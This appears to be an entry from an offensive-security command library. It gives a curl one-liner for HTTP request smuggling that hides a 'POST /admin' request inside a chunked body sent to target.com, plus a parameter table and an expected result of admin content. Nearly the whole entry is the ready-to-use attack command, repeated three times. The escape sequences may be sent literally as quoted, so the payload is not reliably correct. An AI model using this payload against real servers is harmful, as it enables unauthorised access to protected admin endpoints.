---
data: >-
  curl -v -H "Transfer-Encoding: chunked" -d "1\r\na\r\n0\r\n\r\nPOST /admin
  HTTP/1.1\r\nHost: target.com\r\nContent-Length: 0\r\n\r\n" http://target.com
tags:
  - http
  - crafting
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: c848fa14-d97f-4fe0-bb59-822de8f63b03
created_at: '2025-12-13T09:01:17.683Z'
updated_at: '2025-12-13T09:01:17.683Z'
verified: false
validated: true
submitted: true
---
# Curl Craft Smuggling Request

## Command

```bash
curl -v -H "Transfer-Encoding: chunked" -d "1\r\na\r\n0\r\n\r\nPOST /admin HTTP/1.1\r\nHost: target.com\r\nContent-Length: 0\r\n\r\n" http://target.com
```

## Description

Crafts a chunked HTTP request to smuggle a POST request, exploiting parsing flaws in servers like Node.js llhttp.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-v` | Verbose output | No |
| `-H "Transfer-Encoding: chunked"` | Enables chunked transfer | Yes |
| `-d "..."` | Payload with smuggled POST | Yes |

## Examples

### Basic Usage

```bash
curl -v -H "Transfer-Encoding: chunked" -d "1\r\na\r\n0\r\n\r\nPOST /admin HTTP/1.1\r\nHost: target.com\r\nContent-Length: 0\r\n\r\n" http://target.com
```

## Expected Output

Server processes smuggled request, potentially returning admin content or errors.

## Related

- [[procedures/Craft-HTTP-Smuggling-Request]]
